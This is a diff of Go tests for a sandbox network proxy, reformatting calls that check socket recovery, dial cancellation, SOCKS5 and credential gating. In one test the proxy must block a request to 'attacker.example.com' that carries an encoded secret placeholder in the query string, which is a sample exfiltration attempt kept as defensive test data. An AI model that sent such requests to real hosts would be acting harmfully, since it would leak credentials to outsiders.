@@ -21,7 +21,10 @@ func TestOwnedStaleSocketRecoveryAndLiveSocketProtection(t *testing.T) {
 	}
 	defer os.RemoveAll(dir)
 	base := filepath.Join(dir, "vsock")
-	stale, err := net.ListenUnix("unix", &net.UnixAddr{Name: base + "_2049", Net: "unix"})
+	stale, err := net.ListenUnix(
+		"unix",
+		&net.UnixAddr{Name: base + "_2049", Net: "unix"},
+	)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -30,34 +33,60 @@ func TestOwnedStaleSocketRecoveryAndLiveSocketProtection(t *testing.T) {
 		t.Fatal(err)
 	}
 	var proofCalls atomic.Int32
-	m, err := New(Options{RecoverStaleSocket: func(b Binding, path string, info os.FileInfo) bool {
-		proofCalls.Add(1)
-		return b.SandboxID == "s" && path == base+"_2049" && info.Mode()&os.ModeSocket != 0
-	}})
+	m, err := New(
+		Options{
+			RecoverStaleSocket: func(b Binding, path string, info os.FileInfo) bool {
+				proofCalls.Add(1)
+				return b.SandboxID == "s" && path == base+"_2049" &&
+					info.Mode()&os.ModeSocket != 0
+			},
+		},
+	)
 	if err != nil {
 		t.Fatal(err)
 	}
 	defer m.Close()
-	if err := m.Bind(context.Background(), "s", "t", base, Policy{Mode: "relay"}, nil); err != nil {
+	if err := m.Bind(
+		context.Background(),
+		"s",
+		"t",
+		base,
+		Policy{Mode: "relay"},
+		nil,
+	); err != nil {
 		t.Fatal(err)
 	}
 	if proofCalls.Load() != 1 {
 		t.Fatal("stale socket was not authenticated")
 	}
 	// Even an ownership callback cannot authorize removing a live listener.
-	other, err := New(Options{RecoverStaleSocket: func(Binding, string, os.FileInfo) bool { return true }})
+	other, err := New(
+		Options{
+			RecoverStaleSocket: func(Binding, string, os.FileInfo) bool { return true },
+		},
+	)
 	if err != nil {
 		t.Fatal(err)
 	}
 	defer other.Close()
-	if err := other.Bind(context.Background(), "s", "t", base, Policy{Mode: "relay"}, nil); err == nil {
+	if err := other.Bind(
+		context.Background(),
+		"s",
+		"t",
+		base,
+		Policy{Mode: "relay"},
+		nil,
+	); err == nil {
 		t.Fatal("replaced a live socket")
 	}
 	// Revoke must not unlink a different inode installed at the same pathname.
 	if err := os.Remove(base + "_2049"); err != nil {
 		t.Fatal(err)
 	}
-	replacement, err := net.ListenUnix("unix", &net.UnixAddr{Name: base + "_2049", Net: "unix"})
+	replacement, err := net.ListenUnix(
+		"unix",
+		&net.UnixAddr{Name: base + "_2049", Net: "unix"},
+	)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -73,12 +102,19 @@ func TestOwnedStaleSocketRecoveryAndLiveSocketProtection(t *testing.T) {
 func TestRevokeCancelsInFlightNumericDial(t *testing.T) {
 	started := make(chan struct{})
 	stopped := make(chan struct{})
-	m, b := newTestManager(t, Options{DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
-		close(started)
-		<-ctx.Done()
-		close(stopped)
-		return nil, ctx.Err()
-	}}, Policy{Mode: "relay"}, nil)
+	m, b := newTestManager(
+		t,
+		Options{
+			DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
+				close(started)
+				<-ctx.Done()
+				close(stopped)
+				return nil, ctx.Err()
+			},
+		},
+		Policy{Mode: "relay"},
+		nil,
+	)
 	client := proxyClient(t, m, b)
 	done := make(chan struct{})
 	go func() {
@@ -128,7 +164,12 @@ func TestSOCKS5HalfClose(t *testing.T) {
 			_, _ = conn.Write(append([]byte("echo:"), data...))
 		}
 	}()
-	_, b := newTestManager(t, Options{DialContext: targetDialer(up.Addr().String(), nil)}, Policy{Mode: "relay"}, nil)
+	_, b := newTestManager(
+		t,
+		Options{DialContext: targetDialer(up.Addr().String(), nil)},
+		Policy{Mode: "relay"},
+		nil,
+	)
 	conn, status := socksConnect(t, b.SOCKSPath, "example.com", 1)
 	defer conn.Close()
 	if status != 0 {
@@ -151,21 +192,48 @@ func TestCredentialsRequireAuditAndEncodedPlaceholdersAreDenied(t *testing.T) {
 		t.Fatal(err)
 	}
 	defer m.Close()
-	secrets := map[string]Secret{"key": {Value: "host-secret", Hosts: []string{"example.com"}, Header: "Authorization", Placeholder: "Bearer phantom"}}
-	if err := m.Bind(context.Background(), "s", "t", "/tmp/unused", Policy{Mode: "relay"}, secrets); err == nil {
+	secrets := map[string]Secret{
+		"key": {
+			Value:       "host-secret",
+			Hosts:       []string{"example.com"},
+			Header:      "Authorization",
+			Placeholder: "Bearer phantom",
+		},
+	}
+	if err := m.Bind(
+		context.Background(),
+		"s",
+		"t",
+		"/tmp/unused",
+		Policy{Mode: "relay"},
+		secrets,
+	); err == nil {
 		t.Fatal("credentials activated without an audit sink")
 	}
 	m2, b := newTestManager(t, Options{}, Policy{Mode: "relay"}, secrets)
-	resp, _ := get(t, proxyClient(t, m2, b), "https://attacker.example.com/?token=Bearer+phantom")
+	resp, _ := get(
+		t,
+		proxyClient(t, m2, b),
+		"https://attacker.example.com/?token=Bearer+phantom",
+	)
 	if resp.StatusCode != 403 {
 		t.Fatal("encoded placeholder was forwarded")
 	}
 }
 
 func TestPolicyIsCopiedAndBindContextIsInstallationOnly(t *testing.T) {
-	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") }))
+	up := httptest.NewServer(
+		http.HandlerFunc(
+			func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") },
+		),
+	)
 	defer up.Close()
-	m, err := New(Options{Resolver: publicResolver(), DialContext: targetDialer(up.Listener.Addr().String(), nil)})
+	m, err := New(
+		Options{
+			Resolver:    publicResolver(),
+			DialContext: targetDialer(up.Listener.Addr().String(), nil),
+		},
+	)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -177,7 +245,14 @@ func TestPolicyIsCopiedAndBindContextIsInstallationOnly(t *testing.T) {
 	defer os.RemoveAll(dir)
 	p := Policy{Mode: "relay", AllowedHosts: []string{"example.com"}}
 	ctx, cancel := context.WithCancel(context.Background())
-	if err := m.Bind(ctx, "s", "t", filepath.Join(dir, "vsock"), p, nil); err != nil {
+	if err := m.Bind(
+		ctx,
+		"s",
+		"t",
+		filepath.Join(dir, "vsock"),
+		p,
+		nil,
+	); err != nil {
 		t.Fatal(err)
 	}
 	cancel()
@@ -187,13 +262,30 @@ func TestPolicyIsCopiedAndBindContextIsInstallationOnly(t *testing.T) {
 	if resp.StatusCode != 200 {
 		t.Fatal("binding changed after caller mutation or context cancellation")
 	}
-	if err := m.Bind(context.Background(), "s", "t", filepath.Join(dir, "vsock"), p, nil); err == nil {
+	if err := m.Bind(
+		context.Background(),
+		"s",
+		"t",
+		filepath.Join(dir, "vsock"),
+		p,
+		nil,
+	); err == nil {
 		t.Fatal("duplicate binding was silently accepted")
 	}
 	if err := m.Close(); err != nil {
 		t.Fatal(err)
 	}
-	if err := m.Bind(context.Background(), "s2", "t", filepath.Join(dir, "vsock"), p, nil); !errors.Is(err, ErrClosed) {
+	if err := m.Bind(
+		context.Background(),
+		"s2",
+		"t",
+		filepath.Join(dir, "vsock"),
+		p,
+		nil,
+	); !errors.Is(
+		err,
+		ErrClosed,
+	) {
 		t.Fatalf("closed manager accepted binding: %v", err)
 	}
 }
